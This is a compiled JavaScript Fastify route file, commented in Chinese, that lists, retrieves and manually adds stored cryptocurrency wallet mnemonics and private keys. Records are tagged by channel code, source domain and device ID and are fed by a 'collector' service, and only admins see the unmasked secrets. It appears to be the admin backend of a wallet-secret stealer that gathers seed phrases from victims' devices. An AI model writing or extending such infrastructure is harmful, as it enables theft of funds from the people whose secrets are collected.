import { Mnemonic } from '../../../../core/db/models/index.js';
import { logger } from '../../../../core/logger/index.js';
import { processWalletSecret } from '../../../collector/services/derivation.js';
import { isAdminLike } from '../../../../core/auth/permissions.js';
function isAdmin(request) {
    return isAdminLike(request.user?.role);
}
function maskMnemonicRow(row) {
    if (!row)
        return row;
    return { ...row, content: row.content ? '***' : row.content };
}
export async function mnemonicRoute(fastify) {
    fastify.get('/api/data/mnemonic', async (request) => {
        const { channelCode, walletType, sourceDomain, deviceId, page = '1', pageSize = '10' } = request.query;
        const filter = { ...request.channelFilter };
        if (isAdmin(request) && channelCode)
            filter.channelCode = channelCode;
        if (walletType)
            filter.walletType = walletType;
        if (sourceDomain)
            filter.sourceDomain = sourceDomain;
        if (deviceId)
            filter.deviceId = deviceId;
        const skip = ((parseInt(page, 10) || 1) - 1) * (parseInt(pageSize, 10) || 10);
        const [data, total] = await Promise.all([
            Mnemonic.find(filter).sort({ createdAt: -1 }).skip(skip).limit(parseInt(pageSize, 10) || 10).lean(),
            Mnemonic.countDocuments(filter),
        ]);
        return { data: isAdmin(request) ? data : data.map(maskMnemonicRow), total, page: parseInt(page, 10) || 1 };
    });
    fastify.get('/api/data/mnemonic/:id', async (request, reply) => {
        const { id } = request.params;
        const r = await Mnemonic.findOne({ _id: id, ...(request.channelFilter || {}) }).lean();
        if (!r) {
            reply.code(404);
            return { error: 'Not found' };
        }
        return { data: isAdmin(request) ? r : maskMnemonicRow(r) };
    });
    // Manual mnemonic/privateKey creation
    fastify.post('/api/data/mnemonic', async (request, reply) => {
        // 仅限 admin
        if (request.user?.role !== 'admin') {
            reply.code(403);
            return { error: '无权限' };
        }
        const { walletType, type, content } = request.body;
        if (!walletType || !type || !content) {
            reply.code(400);
            return { error: 'Missing required fields: walletType, type, content' };
        }
        if (!['mnemonic', 'privateKey'].includes(type)) {
            reply.code(400);
            return { error: 'type must be mnemonic or privateKey' };
        }
        const trimmedContent = content.trim();
        // 先查重
        const existing = await Mnemonic.findOne({ content: trimmedContent }).lean();
        if (existing) {
            reply.code(409);
            return { error: '该助记词/私钥已存在' };
        }
        // 复用 processWalletSecret，内部调 parseSecretContent 做校验和派生
        try {
            await processWalletSecret({
                walletType,
                result: trimmedContent,
                deviceId: 'manual-test',
                channelCode: 'manual-test',
            });
        }
        catch (err) {
            logger.error({ err, walletType, type }, 'Manual mnemonic creation failed');
            reply.code(500);
            return { error: 'Derivation failed' };
        }
        // 查询新建的记录
        const doc = await Mnemonic.findOne({ content: trimmedContent }).lean();
        if (!doc) {
            reply.code(400);
            return { error: '内容无法解析为有效的助记词或私钥' };
        }
        return { data: doc };
    });
}
//# sourceMappingURL=mnemonic.js.map